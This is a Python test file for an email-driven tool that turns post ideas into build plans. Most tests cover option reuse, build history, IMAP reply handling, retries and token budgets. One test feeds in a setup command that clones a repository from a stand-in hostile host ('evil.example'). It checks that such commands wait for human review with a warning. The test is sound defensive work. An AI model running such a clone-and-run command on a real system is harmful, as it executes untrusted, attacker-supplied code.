"""Eng review 2026-10-23, tasks T1-T4: command safety in BUILD.md (D3, D16), options reuse and
fresh lists (D4, D23), build history and redo (D5, D18, D19), merge-on-save (D26)."""

import json
import types
from pathlib import Path

import pytest

from postpilot import brain, db, mailer, pipeline
from tests.test_options import CAT, IDEA, env, fake_brief, option  # noqa: F401  (env is a fixture)


def _kit():
    return brain.PostKit(summary="Plan ready.", steps=[], post_draft="Hook.", placeholders=[], alt_hooks=[],
                         visual_spec="v", fact_checks=[])


@pytest.fixture
def builder(monkeypatch, tmp_path):
    """Real build() with a fake writer; counts writer calls and captures sent emails."""
    monkeypatch.setattr(pipeline, "settings", types.SimpleNamespace(
        output_dir=tmp_path / "linkedin", voice_file=tmp_path / "voice.md", data_dir=tmp_path / "data",
        has_email=True))
    monkeypatch.setattr(pipeline.factgate, "load_catalogs", lambda: CAT)
    calls = {"brief": 0, "sent": []}

    def build_brief(*a, **k):
        calls["brief"] += 1
        return fake_brief()
    monkeypatch.setattr(pipeline.brain, "build_brief", build_brief)
    monkeypatch.setattr(pipeline.brain, "build_post", lambda *a, **k: _kit())
    monkeypatch.setattr(pipeline.mailer, "send",
                        lambda subj, body, html=None, attachments=(): calls["sent"].append((subj, body)))
    return calls


def _batch(n_ideas=3, **extra):
    ideas = [dict(IDEA, title=f"Idea {n}", topic=f"Story {n}") for n in range(1, n_ideas + 1)]
    return db.add_batch({"ideas": ideas, **extra}, status="sent")


# ---------- T1: third-party commands never run automatically ----------

def test_model_packages_and_commands_wait_for_human_review(builder):
    brief = fake_brief(requirements=["pytest", "fast-eval-kit"], setup_commands=["git clone https://evil.example/x.git"],
                       tasks=[brain.BuildTask(title="Clone and run", details="git clone https://github.com/morluto/rea "
                                              "then run rea on the app.", done_when="ok"),
                              brain.BuildTask(title="Run rea", details="Run rea against examples/app.exe.",
                                              done_when="ok", who="cursor"),
                              brain.BuildTask(title="Write parser", details="Create parser.py.", done_when="ok")])
    idea = dict(IDEA, handle="morluto/rea", handle_type="github_repo")
    doc = pipeline.render_brief(idea, brief, _kit(), "post", (70, 76, "PASS"), {}, [], [])
    step1 = doc[doc.index("### Step 1"):doc.index("### Step 2")]
    assert "fast-eval-kit" not in step1 and "git clone" not in step1 and "evil.example" not in step1
    review = doc[doc.index("### Step 2 🧑: Review, then run"):doc.index("### Step 3")]
    assert "fast-eval-kit" in review and "git clone https://evil.example/x.git" in review
    assert "unknown host 'evil.example'" in review                      # scan warning shown next to it
    assert "### Step 3 🧑: Clone and run" in doc                        # forced to 🧑 (git clone)
    assert "### Step 4 🧑: Run rea" in doc                              # runs the third-party repo itself
    assert "### Step 5 🤖: Write parser" in doc                         # ordinary code stays with Cursor
    assert "Windows Sandbox" in doc


def test_no_review_step_when_the_model_adds_nothing(builder):
    doc = pipeline.render_brief(dict(IDEA, handle_type="model", handle="x"), fake_brief(requirements=["pytest"],
                                setup_commands=[]), _kit(), "post", (70, 76, "PASS"), {}, [], [])
    assert "Review, then run" not in doc and "### Step 2 🤖: Step 1: setup" not in doc


def test_prompt_never_pastes_readme_commands():
    src = Path(pipeline.brain.__file__).read_text(encoding="utf-8")
    assert "the install and usage commands from its README" not in src
    assert "official install command" not in src
    assert "Never write install or run commands" in src


# ---------- T2: options are reused; fresh lists get their own tag ----------

def test_second_request_resends_saved_options(env):
    bid, calls = env
    first = pipeline.propose(bid, 3, send_email=False)
    again = pipeline.propose(bid, 3, send_email=False)
    assert calls["options"] == 1 and again["options"] == first["options"]   # no second writer call


def test_fresh_list_gets_a_tag_and_old_email_is_told_it_was_replaced(env, monkeypatch):
    bid, calls = env
    sent = []
    monkeypatch.setattr(pipeline, "settings", types.SimpleNamespace(**{**vars(pipeline.settings), "has_email": True}))
    monkeypatch.setattr(pipeline.mailer, "send", lambda subj, body, html=None, attachments=(): sent.append(subj))
    pipeline.propose(bid, 3)
    pipeline.handle_reply(bid, None, "3 new")                     # fresh list
    assert calls["options"] == 2 and sent[-1].startswith(f"[PostPilot #{bid}.3b]")
    pipeline.handle_reply(bid, "3", "1")                          # reply to the OLD options email
    assert calls["builds"] == [] and "replaced" in sent[-1]
    pipeline.handle_reply(bid, "3b", "1")                         # reply to the new one builds
    assert calls["builds"] == [(bid, 3, 1)]


def test_reply_words_and_tags():
    assert mailer.parse_reply("3 new please", n_ideas=3) == ("3 new", None)
    assert mailer.parse_reply("2 go", n_ideas=3) == ("2 go", None)
    m = mailer.TAG_RE.search("Re: [PostPilot #8.3b] Build options")
    assert (m.group(1), m.group(2), m.group(3)) == ("8", "3", "b")
    assert mailer.subject_for(8, "x", idea=3, version="b") == "[PostPilot #8.3b] x"


# ---------- T3: every build is remembered; repeats are resent ----------

def test_builds_survive_later_steps_and_all_count_in_history(builder, monkeypatch):
    monkeypatch.setattr(pipeline.brain, "make_options", lambda *a, **k: brain.BuildOptions(
        options=[option("Demo"), option("Repo", kind="open-source-tool")], recommended_reason="r", recommended=1))
    bid = _batch()
    pipeline.build(bid, 3)
    pipeline.propose(bid, 1, send_email=False)                    # used to overwrite "built"
    assert db.get_batch(bid)["status"] == "built"
    pipeline.build(bid, 1)
    topics = [h["topic"] for h in pipeline._history()]
    assert "Story 3" in topics and "Story 1" in topics


def test_repeat_build_resends_saved_plan_without_model_calls(builder):
    bid = _batch()
    out = pipeline.build(bid, 2)
    pipeline.build(bid, 2)                                        # e.g. a redo after a crash
    assert builder["brief"] == 1 and len(builder["sent"]) == 2
    assert builder["sent"][0][1] == builder["sent"][1][1]          # the same BUILD.md both times
    pipeline.build(bid, 2, reuse=False)                           # the CLI forces a fresh plan
    assert builder["brief"] == 2 and out.exists()


def test_second_idea_reply_after_a_build_is_not_ignored(env):
    bid, calls = env
    db.edit_batch(bid, lambda d: d.setdefault("builds", []).append(
        {"idea": 3, "option": 1, "built_at": db.now_iso(), "build_dir": "x"}), status="built")
    pipeline.handle_reply(bid, None, "1")
    assert calls["options"] == 1


def test_skip_after_a_build_is_ignored_and_old_batches_still_count(env):
    bid, calls = env
    db.edit_batch(bid, lambda d: d.setdefault("builds", []).append(
        {"idea": 3, "option": 1, "built_at": db.now_iso(), "build_dir": "x"}), status="built")
    pipeline.handle_reply(bid, None, "skip")
    assert db.get_batch(bid)["status"] == "built"
    old = db.add_batch({"ideas": [dict(IDEA, topic="Old story")]}, status="built")
    db.update_batch(old, chosen=1, built_at=db.now_iso())
    assert "Old story" in [h["topic"] for h in pipeline._history()]


# ---------- T4: saves merge, never overwrite ----------

def test_slow_options_save_keeps_a_build_saved_meanwhile(env, monkeypatch):
    bid, calls = env
    original = pipeline.brain.make_options

    def slow_writer(*a, **k):                                     # another save lands mid-generation
        db.edit_batch(bid, lambda d: d.setdefault("builds", []).append(
            {"idea": 2, "option": 1, "built_at": db.now_iso(), "build_dir": "x"}), status="built")
        return original(*a, **k)
    monkeypatch.setattr(pipeline.brain, "make_options", slow_writer)
    pipeline.propose(bid, 3, send_email=False)
    data = json.loads(db.get_batch(bid)["ideas_json"])
    assert data["builds"][0]["idea"] == 2 and "3" in data["options"]
    assert db.get_batch(bid)["status"] == "built"                 # options_sent never moves it back


def test_status_only_moves_forward():
    assert db.forward_status("built", "options_sent", {}) == "built"
    assert db.forward_status("sent", "options_sent", {}) == "options_sent"
    assert db.forward_status("options_sent", "skipped", {"builds": [{"idea": 1}]}) == "options_sent"
    assert db.forward_status("sent", "skipped", {}) == "skipped"
    assert db.forward_status("built", "posted", {}) == "posted"


# ---------- T5: post results are attached to a build (D20) ----------

def test_old_outcome_rows_migrate_to_build_zero(tmp_path):
    import sqlite3
    path = db.settings.data_dir / "postpilot.db"
    path.parent.mkdir(parents=True, exist_ok=True)
    old = sqlite3.connect(path)
    old.executescript("""CREATE TABLE outcomes (batch_id INTEGER PRIMARY KEY, posted_url TEXT, posted_at TEXT,
        recruiters INTEGER DEFAULT 0, founders INTEGER DEFAULT 0, other INTEGER DEFAULT 0, impressions INTEGER,
        reactions INTEGER, comments INTEGER, profile_views INTEGER, updated_at TEXT);
        INSERT INTO outcomes(batch_id, posted_url, recruiters) VALUES (7, 'https://linkedin.com/p/7', 3);""")
    old.commit()
    old.close()
    rows = db.all_outcomes()                                   # first connect migrates
    assert [(r["batch_id"], r["build_no"], r["recruiters"]) for r in rows] == [(7, 0, 3)]


def test_results_go_to_the_build_you_posted_and_report_groups_by_it(capsys):
    o1, o2 = option("Demo").model_dump(), option("Repo", kind="open-source-tool").model_dump()
    bid = db.add_batch({"ideas": [dict(IDEA, topic="Story A", topic_kind="viral-repo")],
                        "options": {"1": {"options": [o1, o2], "tag": ""}},
                        "builds": [{"idea": 1, "option": 1, "built_at": db.now_iso(), "build_dir": "a"},
                                   {"idea": 1, "option": 2, "built_at": db.now_iso(), "build_dir": "b"}]},
                       status="built")
    assert db.set_outcome(bid, posted_url="https://linkedin.com/p/2") == 2          # default: latest build
    db.set_outcome(bid, 1, posted_url="https://linkedin.com/p/1", recruiters=1)
    db.set_outcome(bid, recruiters=4, founders=1)                                    # still build 2
    assert db.get_outcome(bid)["recruiters"] == 4 and db.get_outcome(bid, 1)["recruiters"] == 1
    result = pipeline.report()
    out = capsys.readouterr().out
    assert result["inbound"] == 6
    assert result["by"]["built"]["open-source-tool"]["inbound"] == 5
    assert result["by"]["built"]["demo-app"]["inbound"] == 1
    assert f"#{bid}.b2" in out


# ---------- T6: replies are marked read only after handling (D8) ----------

class FakeInbox:
    """Minimal IMAP stand-in: UID SEARCH / FETCH (PEEK) / STORE, recording what got marked read."""
    def __init__(self, messages):
        self.messages, self.seen = messages, []

    def __call__(self):
        return self

    def uid(self, cmd, *args):
        if cmd == "SEARCH":
            return "OK", [b" ".join(self.messages)]
        if cmd == "FETCH":
            raw = self.messages[args[0]]
            part = raw.split(b"\r\n\r\n")[0] if "HEADER" in args[1] else raw
            assert "PEEK" in args[1]                       # fetching must never mark as read
            return "OK", [(b"1", part)]
        if cmd == "STORE":
            self.seen.append(args[0])
            return "OK", []

    def logout(self):
        pass

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        self.logout()


def _mail(subject, body, sender="me@example.com", verified=True, reply=True):
    auth = "dkim=pass header.i=@example.com" if verified else "dkim=fail"
    head = (f"From: {sender}\r\nSubject: {'Re: ' if reply else ''}{subject}\r\n"
            f"Authentication-Results: mx.google.com; {auth}\r\n")
    if reply:
        head += "In-Reply-To: <x@postpilot.local>\r\n"
    return (head + "\r\n" + body).encode()


def test_fetch_marks_nothing_read_except_unusable_replies(monkeypatch):
    inbox = FakeInbox({b"1": _mail("[PostPilot #4] ideas", "2"),
                       b"2": _mail("[PostPilot #4.2b] options", "1"),
                       b"3": _mail("[PostPilot #4] ideas", "hello"),                     # no number
                       b"4": _mail("[PostPilot #4] ideas", "3", verified=False),         # forged
                       b"5": _mail("[PostPilot #5] What's hot", "ideas...", reply=False)})  # our own email
    monkeypatch.setattr(mailer, "settings", types.SimpleNamespace(
        gmail_address="me@example.com", gmail_app_password="x", to_email="me@example.com"))
    monkeypatch.setattr(mailer, "_imap", inbox)
    monkeypatch.setattr(mailer, "_ideas_in_batch", lambda *a: 3)
    got = mailer.fetch_replies()
    assert got == [(4, None, "2", b"1"), (4, "2b", "1", b"2")]
    assert sorted(inbox.seen) == [b"3", b"4"]                # handled replies and own emails stay unread


def test_reply_marked_read_only_after_handling(monkeypatch):
    marked = []
    monkeypatch.setattr(pipeline, "settings", types.SimpleNamespace(has_email=True))
    monkeypatch.setattr(pipeline.mailer, "fetch_replies", lambda: [(4, None, "2", b"9")])
    monkeypatch.setattr(pipeline.mailer, "mark_read", lambda uids: marked.extend(uids))
    monkeypatch.setattr(pipeline, "handle_reply", lambda *a, **k: None)
    pipeline.check_replies()
    assert marked == [b"9"]

    def killed(*a, **k):
        raise KeyboardInterrupt                                # process stopped mid-build
    monkeypatch.setattr(pipeline, "handle_reply", killed)
    monkeypatch.setattr(pipeline.mailer, "fetch_replies", lambda: [(4, None, "3", b"10")])
    marked.clear()
    with pytest.raises(KeyboardInterrupt):
        pipeline.check_replies()
    assert marked == []                                        # left unread: next check redoes it


# ---------- T7: hopeless errors are not retried; backups are probed (D7, D21) ----------

def _http_error(code, message):
    import io
    import urllib.error
    return urllib.error.HTTPError("u", code, "x", {}, io.BytesIO(message.encode()))


def test_request_too_large_moves_on_without_retrying(monkeypatch):
    import urllib.request
    from postpilot import llm
    calls, sleeps = [], []
    monkeypatch.setattr(llm.time, "sleep", lambda s: sleeps.append(s))

    def too_large(req, timeout=0):
        calls.append(1)
        raise _http_error(429, '{"error":{"message":"Request too large for model qwen on tokens per minute"}}')
    monkeypatch.setattr(urllib.request, "urlopen", too_large)
    p = llm.Provider("qwen", "https://x", "m", "k", strict_schema=True, extra={})
    with pytest.raises(RuntimeError, match="not retried"):
        llm._post(p, {})
    assert len(calls) == 1 and sleeps == []


def test_busy_rate_limit_is_still_retried(monkeypatch):
    import urllib.request
    from postpilot import llm
    calls = []
    monkeypatch.setattr(llm.time, "sleep", lambda s: None)

    class Resp:
        def __enter__(self): return self
        def __exit__(self, *a): return False
        def read(self): return b'{"ok": 1}'
    def fake(req, timeout=0):
        calls.append(1)
        if len(calls) < 3:
            raise _http_error(429, '{"error":{"message":"Rate limit reached, try again in 2s"}}')
        return Resp()
    monkeypatch.setattr(urllib.request, "urlopen", fake)
    assert llm._post(llm.Provider("groq", "https://x", "m", "k", strict_schema=True, extra={}), {}) == {"ok": 1}
    assert len(calls) == 3


def test_probe_reports_unconfigured_and_failures(monkeypatch):
    from postpilot import llm
    monkeypatch.setattr(llm, "providers", lambda role="default": [llm.Provider("openrouter", "https://x", "m", "", True, {})])
    assert llm.probe("openrouter") == "not configured"
    monkeypatch.setattr(llm, "providers", lambda role="default": [llm.Provider("cloudflare", "https://x", "m", "k", True, {})])
    monkeypatch.setattr(llm, "_post", lambda p, b, timeout=0: {"choices": [{"message": {"content": '{"ok": true}'}}]})
    assert llm.probe("cloudflare") == "ok"


# ---------- T9 small gaps (D15) ----------

def test_linkedin_x_and_bing_results_are_parsed():
    from postpilot import sources
    ddg = ('<a rel="nofollow" class="result__a" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fwww.linkedin.com'
           '%2Fposts%2Fa-1&amp;rut=x">I tested <b>REA</b> on 3 apps &amp; here&#x27;s what broke</a>').encode()
    got = sources.social_search("rea", "linkedin.com/posts", fetch=lambda u, h=None: ddg)
    assert got == [{"title": "I tested REA on 3 apps & here's what broke",
                    "url": "https://www.linkedin.com/posts/a-1"}]
    bing = '<h2 class="b"><a href="https://ex.com/a" h="x"><strong>REA</strong> guide &amp; tips</a></h2>'.encode()
    assert sources.web_search("rea", fetch=lambda u, h=None: bing) == [{"title": "REA guide & tips", "url": ""}]


def test_skip_on_an_options_email_changes_nothing(env):
    bid, calls = env
    before = dict(db.get_batch(bid))
    pipeline.handle_reply(bid, "3", "skip")
    assert dict(db.get_batch(bid)) == before and calls["builds"] == [] and calls["options"] == 0


def test_a_crash_while_handling_sends_the_failure_email(env, monkeypatch):
    bid, calls = env
    sent = []
    monkeypatch.setattr(pipeline, "settings", types.SimpleNamespace(**{**vars(pipeline.settings), "has_email": True}))
    monkeypatch.setattr(pipeline.mailer, "send", lambda subj, body, html=None, attachments=(): sent.append((subj, body)))

    def boom(*a, **k):
        raise RuntimeError("all model providers failed")
    monkeypatch.setattr(pipeline, "propose", boom)
    pipeline.handle_reply(bid, None, "2")
    assert sent and "Something failed" in sent[0][0] and "all model providers failed" in sent[0][1]


def test_build_md_warns_about_time_and_an_unused_hot_thing():
    brief = fake_brief(tasks=[brain.BuildTask(title="Huge", details="Write everything.", done_when="ok", minutes=300)])
    idea = dict(IDEA, build_minutes=60, handle="morluto/rea", handle_type="github_repo")
    warnings = pipeline.brief_warnings(idea, brief)
    assert any("promised ~60 min" in w for w in warnings)
    assert any("no step uses morluto/rea" in w for w in warnings)


# ---------- T10: build eval with its own budget and pass/fail bars (D14, D24, D25) ----------

def test_token_budget_stops_paid_calls_instead_of_falling_back(monkeypatch):
    from postpilot import llm
    monkeypatch.setenv("WRITER_PROVIDERS", "openai,groq")
    monkeypatch.setenv("OPENAI_API_KEY", "o")
    monkeypatch.setenv("GROQ_API_KEY", "g")
    calls = []

    def fake_post(p, body, timeout=600):
        calls.append(p.name)
        return {"usage": {"prompt_tokens": 400, "completion_tokens": 200},
                "choices": [{"finish_reason": "stop", "message": {"content": '{"ok": true}'}}]}
    monkeypatch.setattr(llm, "_post", fake_post)
    Ok = type("Ok", (brain.BaseModel,), {"__annotations__": {"ok": bool}})
    with llm.token_budget(1000):
        llm.chat_json("s", "u", Ok, role="writer")                # 600 tokens: fine
        llm.chat_json("s", "u", Ok, role="writer")                # 1,200: now over
        with pytest.raises(llm.BudgetExceeded):
            llm.chat_json("s", "u", Ok, role="writer")
    assert calls == ["openai", "openai"]                          # never silently moved to groq


def test_eval_refuses_when_live_reserve_would_be_touched(monkeypatch, capsys):
    from postpilot import llm
    _batch()
    monkeypatch.setattr(llm, "daily_cap", lambda: 300_000)
    monkeypatch.setattr(llm, "paid_tokens_today", lambda: 190_000)    # only 10k left above the 100k reserve
    assert pipeline.eval_builds(2) == {"refused": True}
    assert "reserved for your live emails" in capsys.readouterr().out


def test_eval_runs_on_a_smaller_budget_at_the_default_cap(monkeypatch):
    from postpilot import llm
    _batch()
    monkeypatch.setattr(llm, "daily_cap", lambda: 100_000)            # the default cap
    monkeypatch.setattr(llm, "paid_tokens_today", lambda: 0)
    seen = {}
    real = llm.token_budget

    def spy(limit):
        seen["limit"] = limit
        return real(limit)
    monkeypatch.setattr(llm, "token_budget", spy)
    monkeypatch.setattr(pipeline, "_make_options", lambda idea: (_ for _ in ()).throw(llm.BudgetExceeded("x")))
    assert pipeline.eval_builds(1) == {"stories": 0, "tokens": 0}
    assert seen["limit"] == 50_000                                     # half the cap stays for live emails


def test_eval_scores_bars_compares_runs_and_saves_nothing(builder, monkeypatch, capsys):
    monkeypatch.setattr(pipeline.brain, "make_options", lambda *a, **k: brain.BuildOptions(
        options=[option("Demo"), option("Repo", kind="open-source-tool")], recommended_reason="r", recommended=1))
    monkeypatch.setattr(pipeline, "_write_post", lambda idea, plan="": (_kit(), "I built it.", {}, (0, 60, "x"),
                                                                       ({}, 80, "PASS")))
    bid = _batch()
    before = dict(db.get_batch(bid))
    first = pipeline.eval_builds(1)
    assert first["stories"] == 1 and first["bars"]["demo + GitHub repo offered"] == 1.0
    assert first["bars"][f"post human score >= {pipeline.POST_TARGET}"] == 1.0
    assert dict(db.get_batch(bid)) == before and builder["sent"] == []     # no saves, no emails
    monkeypatch.setattr(pipeline, "_write_post", lambda idea, plan="": (_kit(), "x", {}, (0, 50, "x"),
                                                                       ({}, 50, "FLAGGED")))
    pipeline.eval_builds(1)
    assert "WORSE than last run" in capsys.readouterr().out
